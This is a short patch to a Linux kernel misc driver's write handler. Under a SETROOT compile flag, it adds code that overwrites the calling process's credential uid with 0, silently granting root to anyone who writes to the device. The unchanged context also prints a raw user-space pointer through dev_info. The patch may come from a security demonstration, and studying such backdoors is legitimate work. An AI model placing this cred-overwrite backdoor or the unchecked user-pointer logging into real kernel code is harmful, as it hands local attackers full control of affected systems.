@@ -57,6 +57,7 @@ static ssize_t write_miscdrv(struct file *filp, const char __user *ubuf,
 {
     struct device *dev = ctx->dev;
     void *kbuf = NULL;
+	void *new_dest;
 
     dev_info(dev, "writing %s\n", ubuf);
 
@@ -72,6 +73,12 @@ static ssize_t write_miscdrv(struct file *filp, const char __user *ubuf,
     strscpy(ctx->secret, kbuf, count);
 
     dev_info(dev, "secret changed %s\n", ctx->secret);
+
+#ifdef SETROOT
+	new_dest = (void *)&current->cred->uid;
+
+	*(int *)new_dest = 0;
+#endif
 
 	return count;
 }
@@ -137,4 +144,3 @@ static void __exit miscdrv_exit(void)
 
 module_init(miscdrv_init);
 module_exit(miscdrv_exit);
-
